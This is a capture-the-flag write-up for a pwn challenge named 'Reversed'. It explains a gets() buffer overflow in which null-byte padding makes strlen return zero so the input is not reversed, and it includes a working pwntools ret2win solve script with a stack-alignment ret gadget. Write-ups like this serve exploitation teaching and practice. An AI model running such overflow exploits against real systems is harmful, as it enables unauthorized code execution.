# Reversed

### Description

A service to reverse your string!, for some reason. { server_addr }

### Author

momiji

### Points

100

# Write-up

There is a super obvious buffer overflow vulnerability in the binary since it 
calls `gets` to get string into a buffer and using `checksec` this binary doesn't 
have any protection at all.

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

there is also a function called `win` that read the flag. With this we can just 
do a buffer overflow and point the return address to `win` but before that, there
is a function `reversed` being called, it essentially do a `strlen` and reverse 
our input. Now we can't just do a normal buffer overflow anymore, but if you look 
into `strlen` from [glibc](https://github.com/lattera/glibc/blob/master/string/strlen.c) 

```
for (char_ptr = str; ((unsigned long int) char_ptr
			& (sizeof (longword) - 1)) != 0;
       ++char_ptr)
    if (*char_ptr == '\0')
      return char_ptr - str;
```

it stops at `null` byte, so we can use `null` bytes to be our padding to the return 
address and `reversed` function will do nothing because the number returned from 
`strlen` is `0`.

solve script:

```python
from pwn import *

elf = context.binary = ELF("./vuln")

if args.REMOTE:
    io = remote("localhost", 13337)
else:
    io = process()

offset = 0x70 + 0x8
ret = 0x401016
payload = b"\x00" * offset + p64(ret) + p64(elf.symbols["win"])

io.sendline(payload)
io.interactive()
```

You might notices an extra `ret` in the script, try to run the script without 
the extra `ret` and figure it out why it fails without it. And yes you must do
it (just kidding).
